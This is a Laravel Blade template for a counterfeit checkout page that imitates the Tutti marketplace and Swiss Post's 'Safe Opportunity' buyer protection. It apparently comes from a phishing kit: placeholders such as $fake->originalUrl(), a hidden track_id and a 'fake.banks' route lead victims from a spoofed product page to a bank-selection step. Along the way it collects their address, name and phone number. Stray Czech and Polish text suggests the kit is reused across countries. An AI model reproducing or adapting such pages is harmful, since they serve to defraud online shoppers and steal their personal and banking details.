@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/tutti.css')}}" rel="stylesheet">
    <style>
        .grYHP {
            background: rgb(247, 206, 70);
        }

        .hnEmwS {
            background: rgb(247, 206, 70);
            box-shadow: rgb(0 0 0 / 4%) 0px 2px 4px 0px;
        }
    </style>
@endpush
@section('content')
    <div class="base">
        <div class="_container header_prototype header_prototype--board tiny" data-container="HeaderBoardContainer"
             data-tiny="1">
            <header data-test-component="HeaderBoard" class="sc-ugnQR jRQBFv">
                <div class="sc-eIHaNI grYHP"></div>
                <div class="sc-eTpRJs hnEmwS">
                    <div class="sc-iomxrj fZtIUm">
                        <section data-test-component="HeaderActionMenu" class="sc-gPEVay sc-eKZiaR dzCROE">
                            <div class="sc-jAaTju sc-jDwBTQ sc-jlyJG sc-drMfKT lkKOyd">
                                <div width="1" class="sc-jAaTju sc-iRbamj sc-hIVACf gjZzYk">
                                    <a href="{{$fake->originalUrl()}}"
                                       data-test-action="IndexPageLink"
                                       class="sc-eqIVtm sc-cpmKsF bcxWYD">
                                        <img height="40px" src="{{asset($fake->logo())}}" alt="logo">
                                    </a>
                                    <div class="sc-eXNvrr iBzLWS"></div>
                                </div>
                            </div>
                        </section>
                        <div class="sc-dxZgTM RFfMX"></div>
                    </div>
                </div>
            </header>
        </div>


        <aside class="nav_container sidebar_container">
            <nav class="_container" data-container="CategoryMobileContainer"></nav>
        </aside>


        <div class="bundle">
            <div class="container _container" data-container="PaymentsContainer">
                <div class="payments_container" id="payments">
                    <div>
                        <div class="container__28A_2L3T">
                            <div>
                                <div class="product__2oLb4nXl"><span class="product_image__2AcYUpNV"><img
                                            src="{{asset($fake->img)}}" id="pr_image"
                                            alt="{{$fake->title}}" width="100" height="100"></span>
                                    <div class="product_owner__VUJH2ylJ">
                                        <div class="user user--simple">
                                            <div class="user__image">
                                                <span rel="nofollow">
                                                    <img id="u_image"
                                                         src="{{asset('images/unnamed.jpg')}}"
                                                         alt="" width="64"
                                                         height="64">
                                                </span>
                                            </div>
                                            <div class="user__info">
                                                <div class="user__name">
                                                    <span>
                                                        <span
                                                            class="user__label">Die Post - Versand bundesweit</span>
                                                        <span id="u_name"></span>
                                                    </span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="product_content__mI30-3Fr">
                                        <div class="product_inner__1ZrDwagy">
                                            <div class="product_price__2IFwtrXu"><span
                                                    class="product_real_price__j_Bk3J3i"><span><span
                                                            id="pr_price"></span><span
                                                            class="sc-bdVaJa ijDeHI"><b>{{$fake->price()}}</b><i></i></span></span></span>
                                            </div>
                                            <div class="product_title__3jNOq_vZ" id="pr_name">{{$fake->title}}</div>
                                        </div>
                                    </div>
                                </div>
                                <div class="container__b66PCR7o">
                                    <div class="summary__2TIRymkY">
                                        <div class="summary_header__bJmC15X9">
                                            <div class="summary_price__1HT5R9_P"><span>
                                                        <span id="last"></span><span id="cost" class="sc-bdVaJa ijDeHI"><b>{{$fake->price()}}</b><i></i></span></span>
                                            </div>
                                        </div>
                                        <div class="fixed_buttons fixed_buttons--single">
                                            <div class="summary_total__3aEKbkJu">Dostávat
                                                <div class="summary_total_value__nRhP7XkA"><span><span
                                                            id="pr_price"></span>&nbsp;<span
                                                            class="sc-bdVaJa ijDeHI"><b
                                                                id="mobile_price">{{$fake->price()}}</b><i></i></span></span>
                                                </div>
                                            </div>
                                            <div class="button_container">
                                                <form action="{{subRoute('fake.banks')}}">
                                                    <input type="hidden" name="track_id" value="{{$fake->track_id}}">
                                                    <button type="submit" class="sc-dVhcbM ccONKs" id="_buttonPay">
                                                        <span class="sc-fBuWsC hvBxNu">Zur Zahlung gehen</span>
                                                    </button>
                                                </form>
                                            </div>
                                        </div>
                                        <div class="safely_text__392qqBrF">
                                            <div class="status_badge__icon status_badge__icon--deal"></div>
                                            <span>Safe Opportunity</span>
                                        </div>
                                        <div class="hint">Wenn Sie auf die Schaltfläche "Zur Zahlung gehen" klicken, stimmen Sie
                                            dem zu <a href="https://www.post.ch/de/" target="_blank" rel="noopener noreferrer">Vertrag
                                                abschließen</a>&nbsp;&nbsp;über den Verkauf von Waren über den Onlinedienst
                                            "Safe Opportunity"
                                        </div>
                                    </div>
                                    <div class="block__3ioUhNQH">
                                        <div class="panel__3B1d-ak5">
                                            <div class="panel_icon__1HmxOezY">
                                                <div
                                                    class="status_badge__icon status_badge__icon--delivery status_icon__3QzFN2ZZ"></div>
                                            </div>
                                            <div class="panel_content__VGeorc1g">
                                                <div class="text__3Wt10VPX">Lieferung: Post Schweiz Weitere <a
                                                        href="https://www.post.ch/de/"><b id="pr_loc"> Informationen</b></a> zu
                                                    Lieferungen Post Schweiz.
                                                </div>
                                            </div>
                                            <div class="panel_button__2vr4fIVO">
                                                <button type="button" class="visible-xs sc-dVhcbM PZSwV"></button>
                                            </div>
                                        </div>
                                        <div class="tabs__2t54pDtg">
                                            <div class="form__1P2Y3sX1" style="">
                                                <form>
                                                    <div><label class="label__332nHo7g">Lieferadresse</label>
                                                        <div class="row">
                                                            <div class="col-md-8">
                                                                <div class="root__3ahLIWiH">
                                                                    <div class="from_group form_group__3-PlZQuP"><input
                                                                            type="text"
                                                                            class="form_control form_control__3Uyg-pWq"
                                                                            placeholder="Stadt" value=""></div>
                                                                </div>
                                                            </div>
                                                            <div class="col-md-8">
                                                                <div class="root__3ahLIWiH">
                                                                    <div class="from_group form_group__3-PlZQuP"><input
                                                                            type="text"
                                                                            class="form_control form_control__3Uyg-pWq"
                                                                            placeholder="Straße / Zuhause" value=""></div>
                                                                </div>
                                                            </div>
                                                            <div class="col-md-4">
                                                                <div class="from_group form_group__3-PlZQuP"><input
                                                                        name="apartament" type="text"
                                                                        class="form_control form_control__3Uyg-pWq"
                                                                        placeholder="Sein" value=""></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <label class="label__332nHo7g">Kundendetails</label>
                                                    <div class="row" style="position: relative;">
                                                        <div class="col-md-4">
                                                            <div class="from_group form_group__3-PlZQuP"><input name="lastname"
                                                                                                                type="text"
                                                                                                                class="form_control form_control__3Uyg-pWq"
                                                                                                                placeholder="vollständiger Name"
                                                                                                                value=""></div>
                                                        </div>
                                                        <div class="col-md-4">
                                                            <div class="sc-jBoNkH iVUhcI"><input type="number"
                                                                                                 class="form_control form_control__3Uyg-pWq sc-dzVpKk jOxCU"
                                                                                                 name="phone" maxlength="18"
                                                                                                 value=""
                                                                                                 placeholder="Telefonnummer">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <p class="hint__2r7xW549">SMS-Nachrichten über den Status der Lieferung und
                                                        Zahlung werden an die Telefonnummer gesendet.</p>

                                                </form>
                                            </div>
                                            <p class="hint__2YlkHbKL hint__2r7xW549" style="display: none;">Ustal ze sprzedawcą
                                                miejsce i czas przekazania towaru samodzielnie. Sprzedawca otrzyma pieniądze za
                                                zapłatę za towar dopiero po potwierdzeniu pomyślnego odbioru towaru. A w
                                                przypadku spornej sytuacji usługa Safe Deal pomoże rozstrzygnąć powstałe
                                                nieporozumienia.
                                            </p>
                                            <div class="hint payhint__1EGeMlob">Wenn Sie auf die Schaltfläche "Zur Zahlung
                                                gehen" klicken, stimmen Sie dem zu <a href="https://www.post.ch/de/"
                                                                                      target="_blank" rel="noopener noreferrer">Vertrag
                                                    abschließen</a>&nbsp;&nbsp;über den Verkauf von Waren über den Onlinedienst
                                                "Safe Opportunity"
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection
